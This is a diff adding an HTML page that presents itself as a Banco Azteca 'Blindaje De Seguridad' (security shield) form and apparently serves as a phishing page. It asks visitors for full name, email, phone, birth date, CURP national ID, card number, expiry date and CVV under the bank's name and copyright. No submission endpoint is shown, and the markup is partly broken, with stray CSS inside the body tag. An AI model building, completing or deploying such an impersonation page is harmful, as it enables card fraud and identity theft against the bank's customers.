@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banco Azteca Blindaje</title>
+    <link rel="stylesheet" href="styles.css"> <!-- Vinculación al archivo CSS -->
+</head>
+<body margin: 0; /* Elimina márgenes predeterminados del body */
+            padding: 0; /* Elimina relleno predeterminado del body */
+        }
+
+        .titulo-imagen {
+            position: absolute; /* Posicionamiento absoluto */
+            top: 0; /* Ubicación en la parte superior de la página */
+            left: 0; /* Ubicación en la esquina izquierda de la página */
+            margin: 0; /* Elimina márgenes */
+            padding: 0; /* Elimina relleno */
+        }
+    <header>
+<img src="logo.png" alt="" class="logo">
+        <h1></h1>
+        <nav>
+            <ul>
+                <li><a href="#">Inicio</a></li>
+                <li><a href="#">Servicios</a></li>
+                <li><a href="#">Contacto</a></li>
+                <li><a href="#">Ayuda</a></li>
+            </ul>
+        </nav>
+    </header>
+    <main>
+        <section class="form-container">
+            <h2>Blindaje De Seguridad</h2>
+            <form action="#" method="post">
+                <label for="nombre">Nombre Completo:</label>
+                <input type="text" id="nombre" name="nombre" required>
+                
+                <label for="email">Correo Electrónico:</label>
+                <input type="email" id="email" name="email" required>
+                
+                <label for="telefono">Teléfono:</label>
+                <input type="tel" id="telefono" name="telefono" required>
+                 
+                <label for="fecha-nacimiento">Fecha de Nacimiento:</label>
+                <input type="date" id="fecha-nacimiento" name="fecha-nacimiento" required>
+
+<label for="curp">CURP:</label>
+                <input type="text" id="CURP" name="CURP" required>
+
+<label for="numero de tarjeta">Número de tarjeta:</label>
+                <input type="text" id="numero de tarjeta" name="numero de tarjeta" required>
+
+<label for="fecha">Fecha de Vencimiento:</label>
+<input type="text" id="mes" name="mes" pattern="(0[1-9]|1[0-2])" placeholder="MM" maxlength="2" required>
+<input type="text" id="anio" name="anio" pattern="[23][0-9]" placeholder="AA" maxlength="2" required>
+
+<label for="cvv">CVV:</label>
+                <input type="text" id="CVV" name="CVV"placeholder="Ej. 223" minlength="3" maxlength="3" required>
+                
+                <button type="submit">Enviar</button>
+            </form>
+        </section>
+    </main>
+    <footer>
+        <p>&copy; 2024 Banco Azteca. Todos los derechos reservados.</p>
+    </footer>
+</body>
+</html>
